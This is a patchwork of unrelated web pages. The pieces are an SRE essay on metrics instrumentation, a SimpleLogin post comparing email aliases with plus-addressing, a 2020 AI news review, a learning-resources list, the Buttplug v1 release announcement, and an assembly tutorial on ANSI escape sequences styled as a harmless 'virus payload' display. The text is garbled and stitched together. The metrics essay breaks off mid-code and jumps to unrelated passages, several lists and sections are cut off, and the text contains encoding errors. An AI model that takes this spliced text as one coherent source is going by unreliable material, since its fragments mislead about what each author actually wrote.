<p>Velocity goals and code testing coverage goals are <em>output</em> based. They’re the steps we think will get us to the outcomes we want. What are the <em>outcomes</em> we want? Let’s build the goals around those.  </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blog-article posted="2018-03-03T18:52:24Z"><p slot="summary">Instrumentation is the foundation of a monitoring infrastructure. It is the part that directly touches the system(s) being monitored, the source of raw data for our collectors and analyzers and dashboards. It is also the only part that is not under an SRE team's direct control – instrumentation is usually plumbed through the codebase by product teams. Given this, an SRE's primary source of leverage is to make adding instrumentation as easy and painless as possible. We do this by writing instrumentation libraries with friendly, approachable, idiomatic APIs.</p><blog-section><h2 slot="title">Metrics</h2><p>Each measurable property of the system is a <i>metric</i>. Repeated measurements of a metric's value yield a <a href="https://en.wikipedia.org/wiki/Time_series">time series</a> of <i>data samples</i>. A metric's definition includes metadata about how to collect, aggregate, and interpret its samples.</p><p>Metric values can in theory be of any serializable data type, but in practice they are numbers, text, or distributions:</p><ul><li>Numeric metrics may have an associated unit, ideally in a machine-readable annotation. This is most important for metrics where the "natural" definition of a unit is divisible, e.g. to record time intervals as an integral amount of milliseconds instead of a fractional amount of seconds.</li><li>Text metrics are most often constants, but are sometimes used for gauges if there's a small number of possible values.</li><li>Distributions are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</li></ul><p>A C-style enumeration such as <code>enum { OPT_FOO = 1; OPT_BAR = 2; }</code> is best reported as <code>"OPT_FOO"</code> and <code>"OPT_BAR"</code><blog-footnote-ref>[<a href="#fn:1">1</a>]</blog-footnote-ref> instead of numeric <code>1</code> and <code>2</code>.</p><p>Booleans can be thought of as the enum <code>{ FALSE, TRUE }</code>. Some monitoring systems give them a separate type to simplify query planning and analysis.</p><p>Metrics can be defined ad-hoc at point of emission, or statically in some global type. I prefer statically declared metrics because that gives the opportunity to attach <a href="#metric-metadata">metric metadata</a>.</p><p>There are four common categories of metrics: constants, gauges, counters, and distributions<blog-footnote-ref>[<a href="#fn:2">2</a>]</blog-footnote-ref>.</p><blog-section><h3 slot="title">Constants</h3><p>A metric that does not change for the lifetime of its associated system component. Samples of a constant metric will always contain the same value. Common examples are build information (e.g. git commit ID), process start time, and process ID. Don't use constants for things that are only constant-ish, such as hostnames.</p><p>Constants can be text or numbers. For numbers, integers usually work better than floats (e.g. represent your start time as <code>int64 milliseconds</code> instead of <code>float64 seconds</code>.</p><table><thead><tr><th>Time</th><th><code>/build/timestamp</code> (seconds since UNIX epoch)</th><th><code>/build/revision_id</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:16</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:17</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr></tbody></table><p>In Go, using a constant metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

Counters are almost always integers to avoid the implications of IEEE-754 rounding.</p><p>Example counter metrics are CPU microseconds spent, or the total request count.</p><p>Counters can only increase.

This style is derived from <a href="http://landing.google.com/sre/book/chapters/practical-alerting.html">Google Borgmon</a>, which uses metric names as symbols in its configuration DSL<blog-footnote-ref>[<a href="#fn:4">4</a>]</blog-footnote-ref>.<ul><li><a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CW_Support_For_AWS.html">Amazon CloudWatch metrics</a> use this format, without a prefix.</li></ul></li><li><a href="https://github.com/etsy/statsd">statsd</a> and its derivatives use <code>short.dotted.words</code>, though the exact symbol set can vary between vendors.<ul><li>For example, <a href="https://help.datadoghq.com/hc/en-us/articles/203764705-What-are-valid-metric-names-">DataDog allows alphanum, underscores, and periods</a>.</li></ul></li><li><a href="https://cloud.google.com/monitoring/api/metrics_gcp">Google Stackdriver</a> uses <code>myapp.com/unix/filesystem/paths</code>, with each product having its own "subdirectory" in the metrics hierarchy.<ul><li>The same style is applied to <a href="https://cloud.google.com/monitoring/api/metrics_aws">AWS metrics in Stackdriver</a>, by adding product-specific prefixes for each CloudWatch metric.</li></ul></li></ul><p>My personal favorite is the UNIX paths style, which I've seen used to great success. Engineers exposed to this style begin to naturally lay out metric hierarchies, with clear meanings and good namespacing.

        <p><a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">Email subaddressing</a>, also known as plus sign (+) trick, is popularized by Gmail and now supported by most email providers. It allows creating a new email address by simply appending the plus sign(<strong>+</strong>) to your current email address.</p>
<p>For example, if your email address is <code>name@email.com</code>, you can quickly create a new email address like <code>name+facebook@email.com</code> for Facebook, <code>name+twitter@email.com</code> for Twitter, etc.</p>
<p>Here’s a closer look at the pros and cons of using the plus sign trick, especially when compared with email aliases.</p>

        

        

        <h3 id="plus-sign-trick-advantages">Plus sign trick advantages</h3>
<p>The main advantage of the plus sign trick is it’s easy to use and already available.</p>
<p>If you use email filters, email subaddressing is also very useful. For example, you can set up a filter to move all emails sent to <code>name+groupon@email.com</code> to the <strong>Promotion</strong> folder.</p>
<p>With subaddressing, you can create an unlimited number of email addresses: just add something after the plus sign and youâ€™ll have a new email address.</p>
<p>If you are a developer or work in QA, being able to quickly create a new email address is very helpful when testing a website or application.</p>
<h3 id="what-are-simplelogin-email-aliases">What are SimpleLogin email aliases?</h3>
<p>An email alias is simply a forwarding email address. Emails sent to an email alias are forwarded to your original email address.</p>
<p>Like the plus sign trick, SimpleLogin allows you to have a different email address for each website: just create a new email alias everytime you need an email address.</p>
<p>Usually an email alias only allows email forwarding but with SimpleLogin, you can also send emails or reply from your email alias.</p>
<p>Currently there are 4 ways of creating a new email alias in SimpleLogin:</p>
<ul>
<li>If you are on a laptop/PC, the <a href="https://addons.mozilla.org/firefox/addon/simplelogin/">Firefox</a> or <a href="https://chrome.google.com/webstore/detail/dphilobhebphkdjbpfohgikllaljmgbn">Chrome</a> extension allows creating a new email alias by clicking on the SimpleLogin icon in the email field. You can also use the right click menu to create a new email alias.</li>
</ul>
<p><img src="https://sldev.ovh/images/one-click-alias.gif" alt=""></p>
<ul>
<li>
<p>Using one of SimpleLogin apps: <a href="https://app.simplelogin.io/">website</a>, Firefox/Chrome extension popup or <a href="https://play.google.com/store/apps/details?id=io.simplelogin.android">Android</a>/<a href="https://apps.apple.com/app/id1494359858">iOS</a> app for more customization. This is the most flexible way and offers advanced options.</p>
</li>
<li>
<p>Creating email aliases on the fly via <strong>catch-all</strong> domain. If you own a domain, you can enable the catch-all option that allows you to use <code>can_be_anything@your-domain.com</code> as email address: it’s automatically created when an email is sent to this address.</p>
</li>
<li>
<p>Creating email aliases on the fly via <a href="https://simplelogin.io/blog/alias-directory/">directory</a>: this is actually similar to the plus sign trick. If you have a directory called <strong>newsletter</strong>, you can then use <code>newsletter+python@simplelogin.fr</code> when signing for a Python newsletter.</p>
</li>
</ul>
<h3 id="plus-sign-trick-email-address-isnt-good-for-privacy">Plus sign trick email address isn’t good for privacy</h3>
<p>Though practical, plus sign trick is well-known and your real email address can be easily extracted: one just needs to remove the part after the plus sign. For this reason, if your subaddress appears in an email leak (that you can easily verify on <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a>), a bad actor can extract your real email address and uses it for a spam/phishing campaign or to match with other data breaches.</p>
<p>Email addresses that contain the plus sign are sometimes (incorrectly) considered invalid. Even worse, a website can silently drop the part after the plus sign and use your real email address instead.</p>
<p>If you use Gmail, you can’t also reply from the subaddress. When you reply to an email sent to a <code>name+newsletter@gmail.com</code>, the reply will come from your real email address <code>name@gmail.com</code></p>
<h3 id="email-aliases-protect-your-privacy">Email aliases protect your privacy</h3>
<p>An email alias is random and there’s no way to link 2 email aliases to the same person.</p>
<p>For email aliases created with a catch-all domain, they can only be linked together if the domain is known to have the catch-all option enabled. There’s no way to detect whether a domain has this option enabled or to know how many people are using a domain, a bad actor usually ignores these email addresses altogether.</p>
<p>For email aliases created via <strong>directory</strong>, you can use a different separator than the plus sign to reduce the chance of your email aliases being linked together. SimpleLogin also supports the hash sign (#) and the slash sign (/) as separator and in the future, you can also use directory as a subdomain (i.e. <code>newsletter.simplelogin.fr</code>). You can then either use <code>newsletter/python@simplelogin.fr</code>, <code>newsletter#python@simplelogin.fr</code> or <code>python@newsletter.simplelogin.fr</code> as email address.</p>
<h3 id="email-aliases-reveal-who-are-selling-your-data">Email aliases reveal who are selling your data</h3>
<p>If you use a different email alias for each website and one of your aliases starts receiving emails it isn’t supposed to receive, you can be sure that this alias is either leaked or sold.</p>
<p>For example, if your email alias for Facebook receives emails from LinkedIn, that means Facebook has sold your data to LinkedIn or they’ve had a data breach. Either way, you can just disable this alias. Your real email address stays hidden.</p>
<p>Data brokers, <a href="https://www.webfx.com/blog/general/what-are-data-brokers-and-what-is-your-data-worth-infographic/">a $200 billion industry</a> use your email address as the common denominator to match users between different datasets. Having thousands of email addresses make their job harder and your privacy better.</p>
<h3 id="email-aliases-are-more-flexible">Email aliases are more flexible</h3>
<p>With email aliases, it’s easy to change where emails are forwarded. You can just add an additional mailbox so every email sent to your email aliases is forwarded to both mailboxes.</p>
<p>You can also have more complex setup like having an email alias for a shoping website that forwards to both your mailbox and your partner’s mailbox. Or an email alias for your support team that allows anyone to receive customer requests and reply from the support email address.</p>
<h3 id="additional-protection">Additional protection</h3>
<p>On popular email services like Gmail, Outlook, your emails are stored in plaintext, meaning anyone who has access to their servers can read your emails. Even though these services claim to have a strict policy in place and promise they would never read your emails, scandals in the past have shown otherwise. With the <a href="https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html">recent Twitter hack</a>, an employee can be social-engineered to leak the data or leave a backdoor for hackers.</p>
<p><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy</a> (PGP) was created in 1991 as a way to encrypt your emails, texts, files, etc. Used by Edward Snowden, journalists, dissidents, … PGP is highly secure and almost unbreakable.</p>
<p>In PGP, you have 2 keys: the private key that allows you to decrypt the emails and that you should never lose. The public key is public (hence the name) that allows anyone who wants to send you an email to encrypt the email. Only you can then read the encrypted email.</p>
<p>SimpleLogin <a href="https://simplelogin.io/blog/introducing-pgp/">supports PGP</a> and allows you to use PGP on email services that don’t natively support it. For example, you can use PGP on your Gmail using browser extensions like <a href="https://www.mailvelope.com/en">Mailvelope</a> or <a href="https://flowcrypt.com/">FlowCrypt</a> and have SimpleLogin encrypting all emails sent to your Gmail.</p>
<h3 id="security">Security</h3>
<p>Though primarily focused on privacy, email aliases are a good way to increase your online security. Email address is usually used with password as account credential. If you use a different email alias for each website, a bad actor now needs to know both your password and the email alias in order to hack your account.</p>
<h3 id="recommendations">Recommendations</h3>
<p>With multiple advantages over plus sign trick, email aliases is a great tool to protect your online privacy. It’s recommended to use a password manager to help remember the email aliases used on different websites.</p>
<p><a href="https://app.simplelogin.io/auth/register">Sign up</a> for a new SimpleLogin account to explore how email aliases can help protect your online privacy. If you have used email aliases in the past, you might be surprised by how easy it becomes now ;).</p>

      <h2 id="overview">Overview</h2>

<p>With 2020 (finally) drawing to a close, it’s a good time to reflect on what happened with AI in the this most weird year. Above is a wordcloud of the most common words used in titles of articles we’ve curated in our <a href="https://lastweekin.ai/">‘Last Week in AI’ newsletter</a> over this past year. This reflects just about 1000 articles that we’ve included in the newsletter in 2020:</p>

<p>Unsurprisingly, the vague but recognizable term “AI” remained the most popular term to use in article titles, with specifics such as “Deep Learning” or “neural network” remaining comparatively rare:</p>

<p>But enough overview – let’s go through the most significant articles we’ve curated from the past year, month by month. As in with our newsletter, these articles will be about Advances &amp; Business, Concerns &amp; Hype, Analysis &amp; Policy, and in some cases Expert Opinions &amp; Discussion within the field. They will be presented in chronological order, and represent a curated selection that we believe are particularly noteworthy. Click on the name of the month for the full newsletter release that started out that month.</p>

</ul>

<h2 id="march"><a href="https://lastweekin.ai/p/2611449_new-article-digest-54">March</a></h2>

<p>March was a big month with three stories standing out.
First is the closing of <strong>Starsky Robotics</strong>, a promising startup that worked on self-driving trucks.
In a detailed blog post, the founder discussed the immense challenges in technology, safety, and economics that face the autonomous driving industry.</p>

<ul>
  <li><a href="https://medium.com/starsky-robotics-blog/the-end-of-starsky-robotics-acb8a6a8a5f5">The End of Starsky Robotics</a></li>
</ul>

<p>Second is the publicity of <strong>Clearview AI</strong>, which violated many ethical and legal norms by scraping pictures of faces on the Internet to power its facial recognition system that allows its customers, from law enforcement to retail chains, to search for anyone with a picture of their face.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/ryanmac/clearview-ai-fbi-ice-global-law-enforcement">Clearview’s Facial Recognition App Has Been Used By The Justice Department, ICE, Macy’s, Walmart, And The NBA</a></li>

</ul>

<p>Lastly is the flood of reports on the fast-developing <strong>Covid-19</strong> and the roles AI/robotics can (and cannot) play to help alleviate the pandemic.</p>

<ul>
  <li><a href="https://www.vox.com/recode/2020/2/27/21156358/surveillance-tech-coronavirus-china-facial-recognition">Coronavirus is the first big test for futuristic tech that can prevent pandemics</a></li>

<p>This month saw the massive protests following <strong>George Floyd</strong>’s killing, leading many to re-examine police conducts in the U.S.
Within the AI community, this often meant questioning police use of facial recognition technologies and the inherent bias in the deployed AI algorithms.
It is under this backdrop that companies like Amazon and IBM put a pause to selling facial recognition software to law enforcement, and many nuanced conversations followed.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Great learning materials are rare. This is a collection of gems I’ve encountered over the years, presented as a 90’s style web link list, intended for anyone who wants to learn new skills.</p>
<hr>

<p><a href="https://www.coursera.org/learn/machine-learning" target="_blank">Machine Learning Coursera Course</a> by Andrew Ng</p>
<p><strong>Skill:</strong> Machine Learning — learn how to apply existing machine learning techniques, understand why they work, and how to troubleshoot issues.</p>
<p><strong>Type of material:</strong> Videos and coding exercises</p>
<p><strong>Why is it good:</strong> Great interplay between lectures and exercises. Clarity of explanations. Introductory scope. Enough math to understand why these methods work, but not too much.</p>
<hr>

<p><a href="https://cses.fi/book/index.php" target="_blank">Competitive Programmer’s Handbook</a> by Antti Laaksonen</p>
<p><strong>Skill:</strong> Exact algorithms — learn how to invent algorithms for ”code competition” -type problems (problems where exactly-correct answer is required and the main challenge is time or memory complexity).</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> Simplified explanations of many algorithmic techniques and algorithmic problem solving approaches. Unlike most algorithm books, this one is focused on ideas and code, not on the underlying math. This is the ”bible” of Finnish competitive programmers.</p>
<hr>

<p><a href="https://cs.gmu.edu/~sean/book/metaheuristics/" target="_blank">Essentials of Metaheuristics</a> by Sean Luke</p>
<p><strong>Skill:</strong> Optimization algorithms — learn techniques to find ”good enough” solutions for problems where an exactly-correct solution is not required. Typically used when an exact algorithm would be computationally infeasible and machine learning methods can not be applied. For example, route optimization often falls into this category.</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> A practical approach. Scope. Clarity of explanations. I recommend you to read this book while implementing and testing selected approaches on a real problem as you go along.</p>
<hr>

<p><a href="https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg/videos" target="_blank">Introduction to Cryptography</a> by Christof Paar</p>

December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>

<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as “Fuck Everything”.</a> Uses ZeroMQ and Python 2.

<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>

<h3 id="overview">Overview</h3>

<p>How can one not find command line art amusing? Specially when we are talking about computer viruses and even more so when referencing MS-DOS ones. The 16 bit era gave us some of the most interesting <a href="https://www.wired.com/2013/10/15-awesome-looking-viruses-from-the-ms-dos-era/">computer virus payloads</a> of all time, but achieving something like this today is not as <em>“trivial”</em> anymore.</p>

<p>As Linux is my OS of choice, I wanted to find something that could get close to these MS-DOS fun payloads for my own modern viruses, and, while it’s possible to <a href="http://seenaburns.com/2018/04/04/writing-to-the-framebuffer/">write directly to the framebuffer</a>, I wanted to try something related to terminal emulators instead. Enter <strong><em>ANSI escape sequences</em></strong>.</p>

<h3 id="how-it-works">How it works</h3>

<blockquote>
<p><em>ANSI escape sequences are a standard for <a href="https://en.wikipedia.org/wiki/In-band_signaling">in-band signaling</a> to control cursor location, color, font styling, and other options on video <a href="https://en.wikipedia.org/wiki/Text_terminal">text terminals</a> and <a href="https://en.wikipedia.org/wiki/Terminal_emulator">terminal emulators</a>. Certain sequences of <a href="https://en.wikipedia.org/wiki/Byte">bytes</a>, most starting with an <a href="https://en.wikipedia.org/wiki/Escape_character#ASCII_escape_character">ASCII Escape</a> and <a href="https://en.wikipedia.org/wiki/Bracket">bracket</a> character followed by parameters, are embedded into text. The terminal interprets these sequences as commands, rather than text to display verbatim.</em></p>

<p><em>ANSI sequences were introduced in the 1970s to replace vendor-specific sequences and became widespread in the computer equipment market by the early 1980s. They are used in development, scientific, commercial text-based applications as well as <a href="https://en.wikipedia.org/wiki/Bulletin_board_system">bulletin board systems</a> to offer standardized functionality.</em></p>

<p><em>Read more: <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></em></p>
</blockquote>

<p>Lots and lots of things you use daily are probably using ANSI escape codes, every time you see colored text on your terminal. Text-based user interfaces, a.k.a <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">TUIs</a> need these control codes to <em>“draw”</em> what you see on your screen.</p>

<p><code>ESC</code> is represented by the well known <code>0x1b</code> <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#ESC">control byte</a> and the usage is as simple as using <code>printf</code> or <code>echo</code> to write the codes to <code>STDOUT</code> (keep in mind that the terminal you are using must support the ANSI sequences, look for <code>termcap</code> , <code>terminfo</code> and <code>infocmp</code> if you need).</p>

<p>There are some very good references for ANSI escape codes around the web, like the one at <a href="https://wiki.bash-hackers.org/scripting/terminalcodes">Bash Hackers Wiki</a>.</p>

<h3 id="code">Code</h3>

<p>While ANSI sequences are rather easy to use in any modern programming language, the same cannot be said for Assembly, mainly because the manual work involved when dealing with strings (I’m talking about pure Assembly, without including any external functions like <code>printf</code> and without invoking <a href="https://linux.die.net/man/1/tput">tput</a>).</p>

<p>Note that my code currently relies on <a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">ioctl</a> Linux system call to manipulate special files (like terminals) but <a href="https://man7.org/linux/man-pages/man3/termios.3.html">termios</a> would be a better approach here instead and I have kept <strong>ioctl</strong> because I wanted to re-use some old code snippet I wrote long time ago, before I knew about <strong>termios</strong>. I imagine it should be fairly easy to make the change if you want to and I plan to do it in the future.</p>

<p>From <a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html">ioctl_tty</a> man page:</p>





<p>
  

Use of ioctl makes for nonportable programs.  Use the POSIX interface described in termios(3) whenever possible.


</p>



<p>A little helper program written in <code>C</code> like the one below can be used display the terminal dimensions (rows and columns) with <code>ioctl</code>:</p>

<div><pre><code data-lang="C"><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>main</span> <span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>struct</span> <span>winsize</span> <span>ws</span><span>;</span>
  <span>ioctl</span> <span>(</span><span>STDIN_FILENO</span><span>,</span> <span>TIOCGWINSZ</span><span>,</span> <span>&amp;</span><span>ws</span><span>);</span>

  <span>printf</span> <span>(</span><span>"lines %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_row</span><span>);</span>
  <span>printf</span> <span>(</span><span>"columns %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_col</span><span>);</span>

  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></div>

<p>Anyway, the example application I wrote will do the following:</p>

<ul>
<li>Save current terminal buffer (<code>ESC[?1049h</code>)</li>
<li>Clear screen (<code>ESC[2J</code>)</li>
<li>Invoke <code>ioctl</code> syscall to retrieve current window dimensions (rows and columns)</li>
<li>Use of the result from <code>ioctl</code> and perform some math to create a cursor, setting its rows and columns <code>(x, y)</code> position to more or less the center of the screen (<code>ESC[x;yH</code>)</li>
<li>Loop using <code>nanosleep</code> and <code>write</code> syscalls to simulate a <em>typewriter</em> effect while we write our message to the screen, byte by byte, including any extra ANSI sequences for formatting</li>
</ul>

<p>You can find the full commented source code with further instructions, all auxiliar functions and variable declarations on <a href="https://github.com/guitmz/ansi-escape">GitHub</a> but let’s go over the mentioned key steps above to understand it better.</p>

<ul>
<li>Saving current terminal buffer by writting <code>ESC[?1049h</code> (represented by <code>save_buffer</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>save_buffer</span><span>]</span>     <span>; loading rsi with ANSI code that saves current terminal buffer</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>save_buffer_size</span>  <span>; loading rdx with save ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                    <span>; saving current terminal</span></code></pre></div>

<ul>
<li>Clearing the screen by writting ESC[2J (represented by <code>clear_screen</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cl</span><span>ear_screen</span><span>]</span>     <span>; loading rsi with ANSI code that clears screen</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>cl</span><span>ear_screen_size</span>  <span>; loading rdx with clear screen ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                     <span>; clearing the screen</span></code></pre></div>

<ul>
<li>Invoking <code>ioctl</code> syscall to retrieve terminal window size (this approach is not always guaranteed to give results and it’s safer to use it in conjunction to a lookup in the <code>termcap</code> database).</li>
</ul>

<div><pre><code data-lang="nasm">    <span>xor</span> <span>rdi</span><span>,</span> <span>rdi</span>         <span>; this means fd will be STDIN (same as "mov rdi, STDIN")</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>TIOCGWINSZ</span>  <span>; ioctl command to get window size</span>
